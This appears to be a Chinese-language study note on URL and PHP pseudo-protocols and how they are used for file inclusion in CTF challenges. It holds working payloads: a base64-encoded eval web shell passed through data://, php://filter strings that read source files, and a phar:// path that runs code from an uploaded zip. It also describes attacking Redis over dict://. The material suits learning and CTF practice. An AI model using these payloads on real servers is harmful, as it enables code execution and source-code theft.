[TOC]

[SecMap - 非常见协议大礼包 - Tr0y's Blog](https://www.tr0y.wang/2021/05/17/SecMap-非常见协议大礼包/#data)

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/20210517104415.png)



####  file://

读取本地文件，浏览器读取本地文件的时候，用的也是这个协议

####  data://

[文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/106665358)

条件：

- `allow_url_include`: `On`
- PHP >= 5.2.0

格式：

`data:[<mediatype>][;base64],<data>`

- `<mediatype>`：可选，指定数据的媒体类型（MIME 类型），例如 `text/plain`、`image/jpeg` 等。这部分内容可以省略。
- `;base64`：可选，表示数据采用 Base64 编码。如果提供了 `;base64`，那么数据部分应该是经过 Base64 编码的。
- `<data>`：实际的数据内容。

```
?file=data://text/plain,<?php phpinfo();?>
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
?file=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8%2B
```

该协议类似于 php://input，区别在于 data:// 是直接获取后面跟着的内容。浏览器一般都支持这个协议，最常用的莫过于展示小图片了；在 CTF 中常用于执行任意 PHP 代码。

每个组件支持的会稍微有点区别，例如 `data:;,<?php phpinfo();?>` 在 Chrome 可以，但是在 PHP 不行

####  dict://

dict 协议是一个字典服务器协议，就是用来查单词的那种字典。字典服务器本来是为了让客户端使用过程中能够访问更多的字典源。

dict 协议的格式：`dict://`+`ip:端口`+`/` + `TCP/IP 数据`

与 gopher 相比，dict 携带的数据无法插入 `\r\n`（只能插入 `\\r\\n`），所以对于大部分组件来说，只能执行一条命令，所以如果一个组件可以一步一步操作（比如 redis），那么才可以利用，那么很明显，需要认证的 redis 是无法通过 dict 攻击的（即使你知道密码也没用），但是可以用来爆破密码。

####  php://

访问各个输入/输出流（I/O streams）。PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符；内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

属于 PHP 中的伪协议，受限于 php.ini 中的配置

#####  php://input

作用：访问请求的原始数据的只读流

条件：

- `allow_url_include`: `On`

- form 表单里的 enctype 不为 `multipart/form-data`（默认为 `application/x-www-form-urlencoded`）。体现在请求头里就是 Content-Type 不能为 `multipart/form-data`（文件上传）

  > Multipart 允许客户端在一次 HTTP 请求中发送多个部分（part）数据，每部分数据之间的类型可以不同。

PHP 在遇到这个伪协议的时候，会读取 POST 的数据当做内容。

比如 readfile、file_get_contents、include，都支持此伪协议。在 CTF 中常用于执行任意 PHP 代码。

#####  php://filter

作用：用于数据流打开时，对数据进行筛选、过滤。

条件：无

格式：`php://filter/[0]=[1]/resource=[2]`

其中：

- `[0]`: 可选 read/write
- `[1]`: 就是过滤器，可以设定一个或多个过滤器名称，以管道符（`|`）分隔即可。比如：`convert`、`string`，更多可参考官方文档：https://www.php.net/manual/zh/filters.php
- `[2]`: 必选的值，为要筛选过滤的数据流，通常是本地文件的路径，绝对路径和相对路径均可以使用。

示例：`php://filter/read=convert.base64-encode/resource=flag.php`

表示读取本地文件 flag.php，并进行 base64 编码。

在 CTF 中常用于读取 PHP 的源码。

```
php://filter 读取服务器中文件，并且在读的过程中会对数据进行编码

php://filter/read=convert.base64-encode/resource=要读的文件名

php://filter/convert.base64-encode/resource=要读的文件名

php://filter/string.rot13/resource=要读的文件名

file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
iconv.从这个编码.转换到这个编码
```

>iconv ( string $in_charset , string $out_charset , string $str ) : 
>string将字符串 str 从 in_charset 转换编码到 out_charset。
>in_charset：输入的字符集。
>out_charset：输出的字符集。
>
>```php
><?php
>echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[hack]);?>');
>?>
>//?<hp pe@av(l_$OPTSh[ca]k;)>?
>```

####  phar://

- 作用：属于 PHP 伪协议，phar（PHP Archive) 是 PHP 里类似于 JAR 的一种打包文件。
- 条件：
  - PHP >= 5.3.0

phar:// 的利用场景示例：

```php
<?php
  $files = $_GET['file'];
  include($files);
?>
```

对于这样的例子，先上传一个 zip 压缩包，里面是一个 txt 文件，内容是：`<?php phpinfo(); ?>`，在知道绝对路径（/www/upload/test.zip）之后，可以利用 phar:// 来执行这段代码，payload: `phar:///www/upload/test.zip/test.txt`

####  zip://

- 作用：属于 PHP 伪协议，用于访问 zip 压缩流

格式：`zip://[压缩文件绝对路径]#[压缩文件内的路径以及文件名]`